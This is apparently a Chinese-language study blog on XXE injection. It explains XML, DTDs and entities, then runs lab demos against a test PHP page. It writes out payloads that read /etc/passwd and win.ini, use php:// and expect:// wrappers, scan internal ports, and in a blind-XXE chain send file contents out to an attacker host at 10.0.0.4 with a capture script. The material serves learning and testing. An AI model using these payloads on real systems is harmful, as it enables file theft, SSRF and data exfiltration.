# XML外部实体攻击简介

**XML外部实体攻击**（XXE，XML External Entity Injection），是一种针对解析[XML](https://zh.wikipedia.org/wiki/XML)格式应用程序的攻击类型之一。此类攻击发生在配置不当的XML解析器处理指向外部实体的文档时，可能会导致敏感文件泄露、拒绝服务攻击、服务器端请求伪造、端口扫描（解析器所在域）和其他系统影响。也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。

XML 1.0标准定义了XML文档结构，同时定义了实体的概念，即某种类型的存储单元。外部一般解析实体或外部参数解析实体通常简称为外部实体，攻击者可声明特定[系统标识符](https://zh.wikipedia.org/w/index.php?title=系统标识符&action=edit&redlink=1)来访问服务器本地或远程内容。XML处理器假设系统标识符为可访问的[统一资源标志符](https://zh.wikipedia.org/wiki/统一资源标志符)（URI），然后将同名的外部实体以系统标识符所指定的资源内容解除引用。若系统标识符被修改，则XML处理器可能会泄露应用程序通常无法访问的秘密信息。



# XML结构

> \- XML被设计为传输和存储数据，其焦点是数据的内容。
>
> \- HTML被设计用来显示数据，其焦点是数据的外观。

XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。

基本语法：

* 所有 XML 元素都须有关闭标签。
* XML 标签对大小写敏感。
* XML 必须正确地嵌套。
* XML 文档必须有根元素。
* XML 的属性值须加引号。

如果你把字符`<`放在 XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。

`<message>hello < world</message>`，为了避免错误。我们用实体引用`&lt;`来代替`<`字符。XML中，有5个预定义的实体引用。



## DTD属性

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。

属性声明使用以下语法：

```
<!ATTLIST 元素名称 属性名称 属性类型 默认值>
```

DTD实例：

```
<!ATTLIST payment Hu3sky CDATA "H">
```

XML实例：

```
<payment Hu3sky="H" />
```

> [引用自：浅谈XML实体注入漏洞](https://www.freebuf.com/vuls/175451.html)

也就是说，`Hu3sky=`的值如果可以由用户控制，那么可以像构造XSS攻击一样，构造出攻击代码。



由于XML是由元素节点组成的树结构，元素之间可存在嵌套关系，因此XML解析器会对XML文档中所有文本也进行解析。为了能够在文本中兼容一些特殊字符 *（默认有`<`、`>`、`&`、`'`和`"`）* ，XML允许在DTD中声明实体并在文本中进行引用，如`<`预定义的实体引用是`<`，是不是有些眼熟？著名的` `其实也是HTML预定义的一个实体引用。

XML实体又分为**内部实体**和**外部实体**，声明方式如下：

```
<!ENTITY name "value">
<!ENTITY name SYSTEM "URI">
<!ENTITY name PUBLIC "PUBLIC_ID" "URI">
```

外部实体声明中，分为`SYSTEM`和`PUBLIC`，前者表示私有资源 *（但不一定是本机）* ，后者表示公共资源。实体声明之后就可以在文本中进行引用了。

>  [原文链接：github.com/gyyyy](https://github.com/gyyyy/footprint/blob/master/articles/2018/xxe-injection-overview.md)



# 有回显演示

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210824232057.png)

构造payload

```
http://www.webtester.com/xxe.php?xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20%20a%20%20%5B%3C%21ENTITY%20b%20SYSTEM%20%22file%3A%2f%2f%2fC%3A%2fWindows%2fwin.ini%22%3E%5D%3E%3Cc%3E%26b%3B%3C%2fc%3E
```

不知道为什么得到的结果是下面这个样子。。。不过已经和上面原始的页面的不一样了。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210824232908.png)

## 伪协议利用

在php中还可以利用伪协议读取任意文件

### file://

```
<?xml version="1.0"?><!DOCTYPE  a  [<!ENTITY b SYSTEM "file:///etc/passwd">]><c>&b;</c>
```

```
http://www.webtester.com/xxe.php?xml=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!doctype%20%20a%20%20%5b%3c!entity%20b%20system%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cc%3e%26b%3b%3c%2fc%3e
```

我也不知道为什么没有成功。。。查看源码：

```
<?php
include 'init.php';

$string_xml = '<?xml version="1.0" encoding="utf-8"?><note><to>George</to><from>John</from><heading>Reminder</heading><body>xml实体注入</body></note>';

$xml = isset($_GET['xml'])?$_GET['xml']:$string_xml;
$data = simplexml_load_string($xml);
echo  '<meta charset="UTF-8">';
print_r($data);
?>
```

水平有限，看不出所以然来，看来要学一学**世界上最好的语言了**（手动狗头）。

### php://

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xdsec [<!ELEMENT methodname ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php" >]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>
```

一如既往的没有成功。。。

### http://

扫描端口

```
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "http://10.0.0.4:80">
]>
<abc>&test;</abc>
```

要裂开了，等回头请教大佬看看是怎么回事。

还有个很奇怪的点是，已经在虚拟机中修改了虚拟网络，部分虚拟机是按照`10.0.0.x`配置IP地址的，但是也有部分是按照路由器的设置来分配IP地址的，即使在虚拟机中设置网卡为`DHCP`也是无济于事，十分郁闷。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825083438.png)

下面这是另外一个虚拟机，可以看到IP地址是和我们预想的保持一致的。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825083713.png)

### expect://

执行命令

```
<?xml version="1.0"?> <!doctype any [ <!entity test system "expect://whoami">
```

别想了，也不会有什么结果的。



# 无回显演示

无回显XXE又称为blind xxe，可以使用外带数据通道提取数据。

访问目标页面查看，发现什么都没有，就是这个样子。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825084338.png)

构造payload，发送到后端

```
?xml=<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///var/www/html/1.txt">
<!ENTITY % remote SYSTEM "http://10.0.0.4/evil.xml">
%remote;
%all;
]>
<root>&send;</root>
```

或者这样

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.0.0.4/1.txt?file=%file;'>">
```

读取内容

```
<?php file_put_contents("1.txt", $_GET['file']); ?>
```

